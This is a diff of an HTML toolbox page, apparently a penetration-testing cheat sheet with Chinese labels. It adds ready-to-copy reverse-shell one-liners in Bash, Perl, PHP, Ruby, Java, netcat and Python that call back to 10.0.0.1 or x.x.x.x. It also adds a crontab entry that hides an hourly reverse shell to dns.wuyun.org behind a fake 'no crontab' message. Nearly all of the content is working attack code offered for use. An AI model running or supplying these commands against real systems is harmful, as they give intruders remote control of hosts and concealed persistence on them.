@@ -1,7 +1,57 @@
 <div class="am-form">
 
     <div class="am-form-group">
-        <label for="pc_src">Python正向连接（linux）</label>
+        <label for="pc_src">本地监听Shell连接</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="2">nc - lvvp 53</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Bash反向shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="2">bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Perl反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="3">perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">PHP反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="3">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Ruby反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="2">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Java反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+r = Runtime.getRuntime();
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
+p.waitFor();</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">NC反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+nc -e /bin/sh 10.0.0.1 1234
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">Python反向Shell</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</textarea>
+    </div>
+
+
+    <div class="am-form-group">
+        <label for="pc_src">Python反向Shell（linux）</label>
         <textarea debounce="500" rows="7">
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -11,6 +61,12 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/bash","-i"])
         </textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">crontab隐蔽反弹</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="2">(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
+</textarea>
     </div>
 
     <div class="am-form-group">
